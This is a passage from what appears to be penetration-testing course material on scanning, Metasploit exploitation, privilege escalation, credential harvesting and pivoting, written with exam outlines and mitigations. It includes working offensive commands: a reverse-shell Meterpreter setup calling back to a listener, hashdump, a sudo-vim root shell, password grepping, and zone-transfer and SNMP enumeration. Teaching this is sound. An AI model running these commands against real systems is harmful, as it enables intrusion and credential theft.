              "Exam framing: 'Explain network scanning techniques and tools' is a 7-14 mark staple. Structure as host discovery -> port scanning -> service/OS detection -> enumeration, name the Nmap flags with their trade-offs, give the worked 37-host/14-port numbers, and end with one enumeration example per service (SMB shares, SNMP community, SMTP VRFY, DNS AXFR) - the examiner rewards seeing scanning and enumeration as distinct phases.",
            ],
            keyTerms: [
              { term: "SYN scan (-sS)", definition: "Half-open port scan that never completes the TCP handshake - fast and less noisy in logs." },
              { term: "Service enumeration", definition: "Querying discovered services for structured data: shares, users, communities, directory objects." },
              { term: "OS fingerprinting", definition: "Inferring the operating system from TCP/IP stack behaviors - TTL, window size, options." },
              { term: "DNS zone transfer (AXFR)", definition: "Replication request that leaks the entire zone if the server allows unauthenticated AXFR." },
            ],
            diagram: {
              kind: "flow",
              title: "From address range to intelligence",
              caption: "Each layer prunes and enriches the last; enumeration output feeds exploitation directly.",
              steps: [
                { label: "Host discovery", note: "-sn sweep: 256 addresses -> 37 live" },
                { label: "Port scan", note: "-sS -p-: 14 open ports found" },
                { label: "Service + OS detection", note: "-sV -O: OpenSSH 8.2, Samba 4.11" },
                { label: "Enumeration", note: "SMB shares, SNMP community, SMTP VRFY" },
                { label: "Correlate", note: "versions -> CVE shortlist -> exploit plan" },
              ],
            },
            bullets: [
              "Sequence: host discovery -> port scan -> service/version -> OS detection -> enumeration.",
              "Nmap grammar: -sn discovery, -sS SYN, -sT connect, -sU UDP, -sA firewall mapping, -sV versions, -O fingerprint, -p- all ports, -T4 speed.",
              "FIN/Xmas/NULL scans evade some firewalls but fail on Windows stacks; UDP scans are slow but catch SNMP/DNS/NTP.",
              "Enumeration targets: SMB 445 (shares, users), SNMP 161 (community 'public'), LDAP 389, SMTP 25 VRFY, DNS 53 AXFR.",
              "Worked chain: 37 live hosts -> 14 ports on one host -> 28 usernames from SMB -> password-spray list.",
              "Log every enumerated asset against the scope sheet - this phase is where scope accidents happen.",
            ],
            callout: {
              type: "warning",
              title: "Enumeration is logged - act accordingly",
              body: "Hosts answer enumeration queries with authentication events, and SOC analysts see them live. Coordinate timing with the RoE, throttle scan rates (-T2 on sensitive segments), and never enumerate a device that is not on the scope sheet - the print server you 'just checked' may be out of contract.",
            },
            codeExample: {
              language: "bash",
              caption: "recon.sh - the Nmap sequence from sweep to intelligence",
              code: `# 1. host discovery without port scanning
nmap -sn 10.0.2.0/24                    # 37 hosts up

# 2. full TCP sweep + versions + OS on one survivor
nmap -sS -sV -O -p- -T4 10.0.2.14       # 14 open ports

# 3. targeted enumeration of what was found
enum4linux -a 10.0.2.14                 # 3 shares, 28 users
snmpwalk -v2c -c public 10.0.2.14       # interface + device inventory
nmap --script smtp-enum-users 10.0.2.30 # VRFY-valid mailboxes
dig @ns1.example.com example.com AXFR   # zone transfer attempt`,
            },
            examQuestions: [
              {
                q: "Explain the stages of network scanning - host discovery, port scanning, service detection and enumeration - and compare the Nmap scan types with their stealth and reliability trade-offs. Include one enumeration example per service.",
                marks: 14,
                outline: [
                  "Host discovery: ICMP/TCP/ARP sweep prunes dead addresses (256 -> 37 live)",
                  "Port scan: SYN half-open fast, connect reliable without raw sockets, FIN/Xmas/NULL RFC tricks fail on Windows",
                  "UDP scan slow but catches SNMP 161/DNS 53/NTP 123; ACK scan maps firewall rules",
                  "Service/OS detection: -sV banners and versions, -O TCP/IP stack fingerprinting",
                  "Enumeration: SMB 445 shares+users (28 names), SNMP 'public' community inventory, SMTP VRFY mailboxes, DNS AXFR zone",
                  "Version strings feed CVE correlation: OpenSSH 8.2, Samba 4.11, MySQL 5.7",
                  "Operational discipline: throttle on sensitive segments, log against scope sheet",
                ],
              },
              {
                q: "Compare SYN, connect, FIN and UDP scanning in Nmap - how each works, when it is chosen, and its failure modes.",
                marks: 7,
                outline: [
                  "SYN (-sS): half-open handshake, fast, needs root, evades naive logging",
                  "Connect (-sT): full handshake, no privileges needed, slower and fully logged",
                  "FIN/Xmas/NULL: closed ports stay silent per RFC, so 'no reply' = closed|filtered - fails on Windows",
                  "UDP (-sU): no response is ambiguous (open|filtered), slow retries - essential for SNMP/DNS/NTP",
                  "Choice follows goal: stealth vs privilege vs firewall mapping vs protocol coverage",
                ],
              },
            ],
          },
          {
            number: "1.7",
            title: "Vulnerability scanning tools",
            body: [
              "Vulnerability scanners automate the middle of the methodology: they fingerprint services, match versions against CVE databases, run authenticated checks, and emit severity-ranked findings. Nessus (Tenable) is the commercial benchmark with the deepest check library; OpenVAS/Greenbone is the open-source equivalent descended from the same codebase; Qualys and Rapid7 InsightVM deliver cloud-managed enterprise scanning; and Nmap's NSE scripting engine covers targeted checks inside the tool every tester already carries. A scanner's output is a list of findings, each with host, port, CVE references, CVSS score and remediation text - typically 200-600 raw findings on a mid-size estate, of which 20-40 survive triage as genuine, exploitable and material.",
              "The two scanning modes change the result more than the tool choice does. Unauthenticated (external) scanning sees only what an anonymous network peer sees: banners, TLS certificate properties, missing patches visible over the network. Authenticated (credentialed) scanning logs into hosts with an agent or SSH/WinRM credentials and reads local state: installed patch level, registry configuration, local users, and software versions not exposed over the network. A worked contrast from a real pattern: an unauthenticated pass on a 40-host estate returns 96 findings, mostly banner-level 'possible version' guesses; adding credentials lifts it to 231 findings, including 14 verified missing patches and 3 misconfigurations (password never expires, SMBv1 enabled, LLMNR enabled) - findings the external pass could never see. The credential choice is why vulnerability management teams exist as a function.",
              "Scanner output needs triage discipline, because raw CVE-matching overproduces false positives: a banner that says 'Apache 2.4.49' may sit behind a backported patch, and the scanner cannot know. Triage steps: deduplicate across hosts, verify each high-severity finding manually (for example confirming path traversal on 2.4.49 with a curl request), map findings to business context (internet-facing production outranks an internal lab), and convert CVSS base scores into priorities with the environmental score adjusters. The result feeds the threat model of section 1.4 and hands exploitation its target list - the scanner never proves exploitability, and writing 'Nessus says' as evidence in a pentest report is the classic junior error this subject exists to prevent.",
              "Exam framing: 'Compare vulnerability scanning tools' or 'explain authenticated vs unauthenticated scanning' are 7-mark standards. Structure as tool table (four tools, one distinguishing row each), the two modes with the 96 vs 231 findings worked contrast, triage as a named pipeline, and the closing rule: scanner output is input to the pentest, not its conclusion.",
            ],
            keyTerms: [
              { term: "Nessus", definition: "Tenable's commercial vulnerability scanner - the de facto benchmark check library." },
              { term: "OpenVAS / Greenbone", definition: "Open-source scanner framework descended from Nessus's original codebase." },
              { term: "Credentialed scan", definition: "Authenticated scanning that reads local patch and configuration state, multiplying finding quality." },
              { term: "False positive triage", definition: "Manual verification of scanner findings before they enter the report or exploit plan." },
            ],
            diagram: {
              kind: "compare",
              title: "Unauthenticated vs credentialed scanning",
              caption: "Same estate, same day: credentials multiply what the scanner can actually see.",
              left: {
                heading: "Unauthenticated (external view)",
                items: [
                  "Sees banners, TLS, network-exposed services only",
                  "96 findings on the 40-host estate, many 'possible'",
                  "Cannot read installed patch level",
                  "Cheap to run, no credential risk",
                ],
              },
              right: {
                heading: "Credentialed (insider view)",
                items: [
                  "Reads patches, registry, local software, config",
                  "231 findings incl. 14 verified missing patches",
                  "Catches SMBv1, password-never-expires, LLMNR",
                  "Requires credential vaulting and audit trail",
                ],
              },
            },
            bullets: [
              "Tools: Nessus (commercial benchmark), OpenVAS/Greenbone (open source), Qualys and InsightVM (cloud-managed), Nmap NSE (targeted checks).",
              "Output anatomy: host, port, CVE ids, CVSS score, remediation text - 200-600 raw findings on a mid-size estate.",
              "Credentialed scanning multiplies visibility: 96 -> 231 findings in the worked example.",
              "Triage pipeline: deduplicate -> verify manually -> business-context rank -> CVSS environmental adjusters.",
              "Banner version guesses are the classic false positive - backported patches defeat version matching.",
              "Scanner findings are input to exploitation, never proof - 'Nessus says' is not report evidence.",
            ],
            callout: {
              type: "warning",
              title: "Do not paste scanner output into the report",
              body: "A pentest report that reads like a Nessus export earns a fail in review. Every finding needs manual verification with reproduction steps, business impact in the client's context, and remediation the client can actually schedule. The scanner shortlists; the tester proves and writes.",
            },
            table: {
              caption: "The scanner field guide - what to name in a comparison answer.",
              headers: ["Tool", "Licence", "Strength", "Typical slot"],
              rows: [
                ["Nessus", "Commercial", "Deepest check library, strong compliance plugins", "Enterprise assessment standard"],
                ["OpenVAS / Greenbone", "Open source (GPL)", "Full framework, self-hosted, free", "Labs, budget-constrained estates"],
                ["Qualys InsightVM class", "Commercial SaaS", "Continuous cloud-managed scanning, asset inventory", "Large estates, VM programmes"],
                ["Nmap NSE", "Open source", "Targeted scripts inside the recon workhorse", "Pentest-specific checks mid-engagement"],
              ],
            },
            examQuestions: [
              {
                q: "Compare the major vulnerability scanning tools and explain authenticated versus unauthenticated scanning with a worked finding-count contrast. Describe the triage pipeline that converts scanner output into report-grade findings.",
                marks: 14,
                outline: [
                  "Tools: Nessus (commercial benchmark), OpenVAS (open source), Qualys/InsightVM (SaaS continuous), Nmap NSE (targeted)",
                  "Unauthenticated mode: banners and network-visible state only",
                  "Credentialed mode: local patches, registry, config - SMBv1, LLMNR, password-policy findings",
                  "Worked contrast: 96 findings external vs 231 credentialed on the same 40 hosts",
                  "False positives: backported patches defeat banner version matching",
                  "Triage: deduplicate -> manual verify -> business-context rank -> CVSS environmental adjust",
                  "Rule: scanner output feeds exploitation planning; it is never itself report evidence",
                ],
              },
              {
                q: "Why does credentialed scanning produce more and better findings than unauthenticated scanning? Give three examples of findings only credentials can reveal.",
                marks: 7,
                outline: [
                  "Anonymous view sees banners and network services only",
                  "Credentials let the scanner read local patch level and configuration",
                  "Example 1: missing KB patch verified locally, not guessed from banner",
                  "Example 2: SMBv1 still enabled - a protocol-level misconfiguration",
                  "Example 3: password-never-expires / LLMNR enabled - policy findings",
                ],
              },
            ],
          },
        ],
      },
    },
    {
      number: 2,
      roman: "II",
      title: "Exploitation and Web Application Security",
      summary:
        "Unit II covers exploiting system and network vulnerabilities, privilege escalation, post-exploitation activities, maintaining access and pivoting, plus web application security - common vulnerabilities, testing methodologies and scanners.",
      chapter: {
        number: "02",
        title: "Exploitation and the Web Attack Surface",
        intro:
          "Unit II covers exploitation and post-exploitation - privilege escalation, pivoting, persistence - and the web application attack surface: the OWASP classes, the testing methodology and the scanners that accelerate it.",
        inOneBreath:
          "Exploitation converts findings into shells: the Metasploit loop ends in evidence, escalation ends in root/SYSTEM, pivoting tunnels through dual-homed hosts. Post-exploitation harvests credentials (4-12 in an hour; one local-admin password on 30 hosts) and writes the impact sentence. Web applications carry 60-70% of exploitable findings: five layers, the OWASP Top 10 with payload-plus-remediation per class, IDOR's id-shift loop, and the map-scan-manual pipeline where business-logic flaws are the manual differentiator.",
        sections: [
          {
            number: "2.1",
            title: "Exploiting system and network vulnerabilities",
            body: [
              "Exploitation is where the methodology's threat model gets proven: taking a verified vulnerability and using it to execute code, read data, or authenticate as someone else. System exploitation targets host software - an outdated OpenSSH, a writable service binary, a kernel bug; network exploitation targets the protocols and appliances in the path - an unauthenticated SMB flaw, a router with default credentials, a VPN gateway missing its vendor patch. The professional loop is uniform: pick the target from the triaged scanner output, select or craft the exploit, verify preconditions (version, architecture, patch level), execute, and capture evidence the instant it lands - shell output, a screenshot, a hash dump - because the evidence, not the shell, is what the report sells.",
              "Metasploit is the standard exploitation framework and its workflow is examinable: msfconsole starts the console; search type:exploit platform:linux postgres matches modules to findings; use exploit/multi/http/... selects one; show options and set RHOSTS 10.0.2.14, set PAYLOAD linux/x64/meterpreter/reverse_tcp configures target and callback; exploit fires and a Meterpreter session opens, from which hashdump (Windows), getsystem (escalation attempt) and migrate (process hopping) continue the engagement. A worked chain from the Unit I scan: Samba 4.11 on 10.0.2.14 with a known CVE matched to an exploit module, payload staged, session opened in 40 seconds, uid=0 obtained because the misconfigured service ran as root - one finding converts to full host compromise. When no module exists, the tester moves to manual exploitation: a hand-crafted SQLi payload, a Python socket script for a buffer overflow, or a public PoC adapted to the version.",
              "Two disciplines separate professionals from script kiddies, and both are marks. First, exploitation is bounded by the RoE - proving a webshell works on the staging host is in scope; exfiltrating the production customer table is not, and even the proof step gets a data-volume limit (read one row, not one table). Second, safety and stability: payload choice avoids destructive actions, a reverse shell is preferred over a bind shell because egress filtering rarely blocks outbound, and every command run is logged with timestamps. The tester also anticipates the cleanup conversation - sessions closed, artifacts removed, and the removal documented - because a pentest that leaves a webshell behind has just manufactured its own incident.",
              "Exam framing: 'Explain exploitation with Metasploit' appears as 7 marks; 'describe a complete exploit chain from scan to shell' as 14. Write the uniform loop, the msfconsole command sequence verbatim, the Samba-to-root worked example, and the two disciplines (RoE bounds, safety and evidence) as the closing paragraph.",
            ],
            keyTerms: [
              { term: "Exploit", definition: "Code or a technique that turns a verified vulnerability into unauthorized code execution or access." },
              { term: "Meterpreter", definition: "Metasploit's advanced in-memory payload with modules for dumping hashes, escalating and pivoting." },
              { term: "Reverse shell", definition: "A payload that connects back to the tester's listener - preferred because egress filtering rarely blocks outbound." },
              { term: "Bind shell", definition: "A payload that listens on a target port for the tester to connect - blocked by most ingress firewalls." },
            ],
            diagram: {
              kind: "flow",
              title: "The exploit chain: finding to evidence",
              caption: "Every arrow is timestamped and screenshotted - the chain is the report's evidence spine.",
              steps: [
                { label: "Triage finding", note: "Samba 4.11 on 10.0.2.14:445" },
                { label: "Match module", note: "search type:exploit samba" },
                { label: "Configure", note: "RHOSTS + reverse_tcp payload" },
                { label: "Exploit", note: "session opened in ~40 s" },
                { label: "Capture evidence", note: "whoami, screenshot, hashdump" },
                { label: "Cleanup", note: "close session, remove artifacts, log" },
              ],
            },
            bullets: [
              "Uniform loop: pick target -> select/craft exploit -> verify preconditions -> execute -> capture evidence.",
              "Metasploit flow: msfconsole -> search -> use -> show options -> set RHOSTS/PAYLOAD -> exploit -> session.",
              "Meterpreter post-tools: hashdump, getsystem, migrate, portfwd (pivoting in section 2.4).",
              "No module? Manual routes: crafted SQLi, Python overflow script, adapted public PoC.",
              "RoE bounds exploitation: proof-of-concept data volumes, no production exfiltration, destructive actions forbidden.",
              "Prefer reverse to bind shells: egress rarely filtered, ingress almost always is.",
            ],
            callout: {
              type: "warning",
              title: "The webshell you forget is your incident",
              body: "Post-engagement cleanup is contractual: close sessions, remove uploaded artifacts, document every removal. Reports have been written about pentests that later became breach investigations because a tester's webshell survived the engagement - the remediation section must be able to say 'removed and verified'.",
            },
            codeExample: {
              language: "bash",
              caption: "metasploit.txt - from CVE match to session",
              code: `msf6 > search type:exploit platform:linux samba
msf6 > use exploit/linux/samba/<matched_cve>
msf6 > set RHOSTS 10.0.2.14
msf6 > set PAYLOAD linux/x64/meterpreter/reverse_tcp
msf6 > set LHOST 10.10.14.5
msf6 > exploit
[*] Sending stage ... Meterpreter session 1 opened
meterpreter > sysinfo            # verify target, capture evidence
meterpreter > hashdump           # Windows; /etc/shadow on Linux
meterpreter > getsystem          # escalate to SYSTEM (attempt)`,
            },
            examQuestions: [
              {
                q: "Explain how a penetration tester exploits system and network vulnerabilities using Metasploit. Walk through the complete workflow from scanner finding to evidence capture, including a worked chain, and state the disciplines that bound exploitation.",
                marks: 14,
                outline: [
                  "Loop: triage finding -> match/craft exploit -> verify preconditions -> execute -> evidence",
                  "Metasploit workflow: msfconsole, search filters, use, set RHOSTS/LHOST/PAYLOAD, exploit",
                  "Payloads: reverse_tcp preferred (egress open), bind blocked by ingress filters",
                  "Meterpreter post-tools: hashdump, getsystem, migrate",
                  "Worked chain: Samba 4.11 CVE -> session in ~40 s -> uid=0 because service ran as root",
                  "RoE bounds: proof data volumes, no production exfiltration, no destructive actions",
                  "Evidence and cleanup: timestamps, screenshots, documented artifact removal",
                ],
              },
              {
                q: "Why does a penetration tester prefer a reverse shell to a bind shell? Explain with firewall behavior.",
                marks: 7,
                outline: [
                  "Bind shell listens on a target port; ingress firewalls typically block inbound connections",
                  "Reverse shell connects out to the tester's listener",
                  "Egress filtering is far rarer than ingress filtering",
                  "The tester runs the listener (multi/handler) on LHOST",
                  "Evidence: shell captured the moment the callback lands",
                ],
              },
            ],
          },
          {
            number: "2.2",
            title: "Privilege escalation techniques",
            body: [
              "Privilege escalation moves a foothold from one privilege level to a higher one - most often from a low-privilege service account to root on Linux or SYSTEM on Windows - and it is where a single foothold becomes a domain problem. The enumeration that precedes it asks a fixed question list: what kernel am I on (uname -a / systeminfo) and does it have a public exploit; what runs as root or SYSTEM (ps aux, scheduled tasks, services); what can my user sudo without a password (sudo -l); what files have SUID/SGID bits (find / -perm -4000); and where are credentials lying around - config files, history files, environment variables, SSH keys. Each answer is a candidate path, and a tester typically collects 5-10 candidates before choosing the one with the cleanest blast radius.",
              "Linux classics with numbers: a sudo entry 'ALL=(ALL) NOPASSWD: /usr/bin/vim' escalates in one command (vim -> :!sh -> root shell) because vim lets you spawn a shell; a SUID copy of /bin/bash owned by root ('chmod u+s /bin/bash') becomes root with a single -p invocation; a writable cron script owned by root runs whatever the tester writes into it at the next cron tick; and kernel exploits end the conversation outright - Dirty COW (CVE-2016-5195) turned any local user into root on unpatched kernels for nearly a decade after disclosure. Windows classics: SeImpersonate-enabled service accounts fall to the Potato family (Juicy/Rogue/GodPotato) which relays a token to SYSTEM; unquoted service paths ('C:\\Program Files\\App\\svc.exe') let a planted exe in 'C:\\Program' take the service's privileges; and AlwaysInstallElevated=1 in two registry keys lets an MSI install run as SYSTEM.",
              "The exam's favourite framing is the comparison: Linux escalates through file and sudo mechanics (permissions, SUID, cron, capabilities like cap_setuid, PATH hijacking of scripts), Windows escalates through token and service mechanics (impersonation, service misconfiguration, registry autoruns, Kerberos abuses such as Kerberoasting which crack a service account's ticket offline at 10-100 guesses/second against a GPU rig). Both families end the same way - SYSTEM or root - and the professional rules are identical: enumerate exhaustively before exploiting, prefer misconfiguration over kernel exploit (a kernel panic on the client's database server is a career event), and document the before/after privilege state as evidence.",
              "Exam framing: 'Explain privilege escalation techniques on Linux and Windows' is a reliable 14-mark question. Open with the definition and the enumeration question list, give the worked Linux trio (sudo vim, SUID bash, cron) with commands, the Windows trio (Potato, unquoted path, AlwaysInstallElevated), then the comparison paragraph and the prefer-misconfiguration rule.",
            ],
            keyTerms: [
              { term: "SUID bit", definition: "A file permission that executes the file with the owner's privileges - root-owned SUID binaries are root shells." },
              { term: "sudo -l", definition: "Lists the invoking user's sudo rights; NOPASSWD entries are one-command escalations." },
              { term: "SeImpersonate", definition: "A Windows privilege whose abuse by service accounts enables the Potato token-relay family." },
              { term: "Kerberoasting", definition: "Requesting service tickets and cracking them offline to recover service-account passwords." },
            ],
            diagram: {
              kind: "compare",
              title: "Linux vs Windows escalation mechanics",
              caption: "Same goal, different plumbing - examiners want both columns filled with one command each.",
              left: {
                heading: "Linux paths",
                items: [
                  "sudo NOPASSWD misconfig: vim -> :!sh",
                  "SUID binaries: find / -perm -4000",
                  "Writable cron scripts run as root",
                  "Kernel: Dirty COW CVE-2016-5195",
                ],
              },
              right: {
                heading: "Windows paths",
                items: [
                  "SeImpersonate -> Potato family to SYSTEM",
                  "Unquoted service path hijack",
                  "AlwaysInstallElevated MSI install",
                  "Kerberoast: crack the service ticket offline",
                ],
              },
            },
            bullets: [
              "Enumeration first: kernel version, root-owned processes, sudo -l, SUID files, credentials in configs and history.",
              "Linux trio: sudo vim NOPASSWD, root-owned SUID bash (-p), writable root cron script.",
              "Windows trio: Potato family via SeImpersonate, unquoted service path, AlwaysInstallElevated registry pair.",
              "Kerberoasting: request SPN tickets, crack offline at 10-100 guesses/second on GPUs.",
              "Prefer misconfiguration over kernel exploits - stability of the client's production beats the wow factor.",
              "Evidence: capture whoami/id before and after escalation with timestamps.",
            ],
            callout: {
              type: "tip",
              title: "sudo -l before anything else",
              body: "The single highest-yield command on a Linux foothold is sudo -l. One NOPASSWD entry for an editor, pager (less, more) or interpreter (python, awk) is a one-line root shell via the GTFOBins technique library. It costs two seconds and ends the escalation conversation.",
            },
            codeExample: {
              language: "bash",
              caption: "enum.sh - the escalation enumeration pass",
              code: `uname -a && cat /etc/os-release      # kernel + distro -> exploit shortlist
sudo -l                              # NOPASSWD entries -> GTFOBins
find / -perm -4000 -type f 2>/dev/null  # SUID inventory
ls -la /etc/cron*                    # root-run scripts
ps aux | grep root                   # root-owned services
grep -ri "password" /etc 2>/dev/null # hardcoded creds

# worked: sudo allows vim without password
sudo vim -c ':!sh'                   # -> root shell`,
            },
            examQuestions: [
              {
                q: "Explain privilege escalation in depth. Describe the enumeration question list, then three Linux techniques and three Windows techniques with the exact mechanics of each, and close with the professional rules that bound escalation during an engagement.",
                marks: 14,
                outline: [
                  "Definition: foothold -> root/SYSTEM; enumeration precedes exploitation",
                  "Question list: kernel, root processes, sudo -l, SUID files, credential hunting",
                  "Linux 1: sudo NOPASSWD vim -> :!sh root shell",
                  "Linux 2: SUID root-owned bash -> bash -p",
                  "Linux 3: writable root cron script executes at next tick; Dirty COW as kernel endgame",
                  "Windows 1: SeImpersonate -> Potato relay to SYSTEM; 2: unquoted service path; 3: AlwaysInstallElevated",
                  "Rules: prefer misconfiguration over kernel exploit; document before/after privilege with evidence",
                ],
              },
              {
                q: "Explain Kerberoasting: what it abuses, the offline step, and why service accounts with long static passwords are the target.",
                marks: 7,
                outline: [
                  "Any domain user can request a service ticket (TGS) for an SPN",
                  "Ticket is encrypted with the service account's password hash",
                  "Offline cracking at 10-100 guesses/second on GPUs",
                  "Long static service-account passwords resist; short ones fall",
                  "Mitigation: managed service accounts (gMSA), strong lengths, monitoring",
                ],
              },
            ],
          },
          {
            number: "2.3",
            title: "Post-exploitation activities",
            body: [
              "Post-exploitation begins the moment the shell lands and answers the business question the engagement exists for: what does this access actually threaten? The canonical sequence is information gathering (who am I, what host is this, what network is it on), credential harvesting (password hashes, tokens, stored browser credentials, cached Kerberos tickets), privilege assessment (can I reach domain admin from here), lateral preparation (map reachable hosts and shares), data demonstration (prove sensitive data is readable - with volume limits), and persistence assessment (can access be re-established - tested only where the RoE allows). Each step is bounded by scope and evidenced, because post-exploitation findings are precisely the ones that convert 'we had a vuln' into 'an attacker would now have your customer database'.",
              "The credential-harvesting step deserves the worked numbers. On a compromised Windows host, hashdump recovers NTLM hashes; on a domain-joined host, Mimikatz-class techniques recover cleartext credentials from LSASS memory when the domain still permits legacy authentication - in a typical mid-2020s engagement against an unhardened domain, 4-12 account credentials fall within an hour. Those credentials are tested against other hosts (password reuse is pervasive: the same local-admin password on 30 workstations converts one compromise into 30), and domain escalation follows - a Domain Admin token found on a compromised workstation grants the domain in one move. The mitigation story examiners want: LSA Protection, Credential Guard, tiered admin models and disabling NTLM reduce exactly this harvest.",
              "Post-exploitation is also where impact is measured honestly. The report needs a sentence a board can read: 'from a single phishing-simulated foothold, the tester reached the finance file share and demonstrated read access to payroll data for 1,900 employees within 90 minutes'. That sentence - access chain, time, data class, count - is the deliverable; a stack of CVEs without it is a technical appendix. Alongside impact, the tester watches stability: avoid crashing the host, avoid tripping the EDR the client asked to remain live, and log every action for the deconfliction call the client's SOC will make mid-engagement.",
              "Exam framing: 'What is post-exploitation? Describe its activities' is a 7-mark staple. Write the definition, the six-step sequence, the credential-harvesting worked example with the 4-12 credentials number and the 30-workstation reuse point, and close with the impact-sentence discipline.",
            ],
            keyTerms: [
              { term: "Credential harvesting", definition: "Collecting hashes, tokens and stored passwords from a compromised host for reuse and escalation." },
              { term: "Lateral movement", definition: "Using harvested credentials to reach additional hosts - password reuse makes one host many." },
              { term: "Impact chain", definition: "The report narrative: foothold -> access -> data class and count -> time elapsed." },
              { term: "Credential Guard", definition: "A Windows hardening feature that isolates LSASS secrets from memory-reading tools." },
            ],
            diagram: {
              kind: "cycle",
              title: "The post-exploitation loop",
              caption: "Gather, harvest, escalate, move, demonstrate - each rotation deepens the impact story.",
              steps: [
                { label: "Gather", note: "whoami, network map, host role" },
                { label: "Harvest", note: "hashes, tokens, stored creds" },
                { label: "Escalate", note: "towards domain admin" },
                { label: "Move laterally", note: "password reuse -> 30 hosts" },
                { label: "Demonstrate data access", note: "read 1 row, prove the class" },
                { label: "Document", note: "timestamps, screenshots, scope check" },
              ],
            },
            bullets: [
              "Sequence: gather -> harvest credentials -> assess privilege path -> prepare lateral movement -> demonstrate data access -> assess persistence.",
              "Harvest tools: hashdump (NTLM), LSASS memory reading, browser credential stores, cached tickets.",
              "Worked numbers: 4-12 credentials from an unhardened domain within an hour; one local-admin password reused on 30 workstations.",
              "Domain escalation: a Domain Admin token on a workstation grants the domain in one move.",
              "Impact sentence format: foothold source, chain, data class and count, elapsed time (90 minutes).",
              "Boundaries: data-read volume limits, EDR stays live per RoE, all actions logged for SOC deconfliction.",
            ],
            callout: {
              type: "exam",
              title: "The impact sentence is the deliverable",
              body: "Examiners and clients both reward the sentence format: 'from X foothold, the tester reached Y within T minutes and demonstrated access to Z records of class D'. Practise writing it for each worked example - it converts technical findings into business risk, which is the entire point of post-exploitation.",
            },
            table: {
              caption: "Post-exploitation activity map with evidence artifacts.",
              headers: ["Activity", "Command / tool", "Evidence artifact"],
              rows: [
                ["Identity and role", "whoami /all, id, hostname", "Screenshot with timestamp"],
                ["Network position", "ipconfig, arp -a, route print", "Interface and ARP capture"],
                ["Credential harvest", "hashdump; LSASS read", "Hash list (redacted in report)"],
                ["Share discovery", "net view, crackmapexec smb", "Share list output"],
                ["Data demonstration", "read 1 row of payroll share", "Redacted screenshot + count"],
                ["Persistence test", "RoE-permitted only", "Documented install and removal"],
              ],
            },
            examQuestions: [
              {
                q: "Describe post-exploitation in a penetration test. Explain its main activities in order, work through credential harvesting and lateral movement with numbers, and explain how impact is expressed in the final report.",
                marks: 14,
                outline: [
                  "Definition: what the foothold threatens, beyond the exploit itself",
                  "Gather: identity, host role, network position",
                  "Harvest: NTLM hashes, LSASS memory, browser stores, tickets - 4-12 creds in an hour",
                  "Lateral: password reuse - one local-admin password on 30 workstations",
                  "Escalate: Domain Admin token on a workstation = the domain",
                  "Demonstrate: read-access proof with volume limits",
                  "Impact sentence: foothold, chain, data class and count, elapsed time; mitigation map: Credential Guard, tiered admin, NTLM disable",
                ],
              },
              {
                q: "Why is credential harvesting the highest-value post-exploitation activity? Explain the password-reuse multiplier.",
                marks: 7,
                outline: [
                  "Credentials convert one host into many (reuse across 30 workstations)",
                  "They enable silent authentication instead of noisy exploitation",
                  "They feed domain escalation (Kerberoast, token theft)",
                  "Mitigations: Credential Guard, LSA Protection, unique local-admin passwords",
                  "Report value: harvest results quantify real exposure",
                ],
              },
            ],
          },
          {
            number: "2.4",
            title: "Maintaining access and pivoting",
            body: [
              "Pivoting is routing attack traffic through a compromised host to reach networks the tester cannot touch directly - the technique that turns one foothold into access to an entire internal zone. The mechanics are simple and examinable: from the first shell, discover the internal network (ipconfig reveals a second interface on 10.0.3.0/24; arp -a lists 12 neighbours); then tunnel through it - Meterpreter's portfwd forwards a single port, autoroute plus a SOCKS proxy (route add 10.0.3.0/24 1; use auxiliary/server/socks_proxy) tunnels arbitrary tools through the session, and SSH offers the same with -D 1080 for a dynamic SOCKS or -L 5432:db.internal:5432 for a fixed forward. Scanning then runs through the pivot: nmap -sT -Pn -n --proxy socks4://127.0.0.1:1080 10.0.3.0/24 finds the finance database tier that was invisible from the tester's own network.",
              "Maintaining access (persistence) is deliberately asymmetric in pentesting: the RoE usually forbids or tightly bounds it, because persistence artifacts - a scheduled task, a service, an added SSH key, a webshell - are the things blue teams most hate finding without warning. Where permitted, the test proves re-access capability with a reversible, documented mechanism (one scheduled task calling back every 10 minutes, removed and verified at cleanup) rather than a rootkit-grade implant. The professional distinction to memorize: red team exercises use persistence to test detection over weeks; penetration tests prove the chain once and clean up. Misjudging that distinction is the fastest way to lose the client's trust mid-engagement.",
              "The detection and mitigation framing completes the answer. Pivoting leaves artefacts defenders can catch: unusual source-to-destination flows (a workstation suddenly scanning the server VLAN), SMB and RDP sessions from non-standard hosts, and SOCKS proxy traffic patterns. Mitigations are segment-specific: network segmentation with least-privilege east-west rules (a workstation should reach at most its own zone), host-based firewalls that log and limit lateral protocols, NDR tooling watching for scanning behavior, and egress filtering that also constrains callback channels. The worked impact line for the report: 'via one compromised jump host, the tester reached the 10.0.3.0/24 finance tier within 20 minutes and enumerated 9 database hosts - segmentation between user and server VLANs would have blocked the pivot'.",
              "Exam framing: 'Explain pivoting and maintaining access' is a 7-14 mark standard. Define pivoting, give the discovery commands, the three tunneling mechanisms with syntax, the nmap-through-SOCKS line, then the persistence-asymmetry paragraph and the segmentation mitigation close.",
            ],
            keyTerms: [
              { term: "Pivoting", definition: "Routing attacks through a compromised host to reach otherwise unreachable network zones." },
              { term: "portfwd", definition: "Meterpreter's single-port TCP forwarder through an existing session." },
              { term: "SOCKS proxy", definition: "A general-purpose proxy (autoroute + socks_proxy or ssh -D) that tunnels arbitrary tools through the pivot." },
              { term: "Persistence", definition: "A mechanism that re-establishes access after reboot or session loss - RoE-bounded in pentests." },
            ],
            diagram: {
              kind: "fork",
              title: "Tunneling choices through the pivot host",
              caption: "One port, all ports, or a full proxy - pick by the next phase's needs.",
              start: "Compromised host on two networks",
              branches: [
                { label: "Single target port", outcome: "portfwd 5432 -> finance DB reachable as localhost", good: true },
                { label: "Whole subnet scanning", outcome: "autoroute + SOCKS -> nmap -sT through 127.0.0.1:1080", good: true },
                { label: "Interactive tools (RDP/SSH)", outcome: "ssh -D 1080 dynamic proxy or chisel tunnel", good: true },
                { label: "Rootkit-grade implant", outcome: "out of pentest scope - RoE forbids; red team only", good: false },
              ],
            },
            bullets: [
              "Discover the internal view first: second interfaces, arp -a neighbours, route tables.",
              "Tunnel trio: portfwd (one port), autoroute + SOCKS (any tool), SSH -D/-L (or chisel) for interactive use.",
              "Scan through the pivot: nmap -sT -Pn -n --proxy socks4://127.0.0.1:1080 10.0.3.0/24.",
              "Worked impact: one jump host -> finance tier in 20 minutes -> 9 database hosts enumerated.",
              "Persistence asymmetry: pentests prove re-access once and clean up; red teams run detection tests for weeks.",
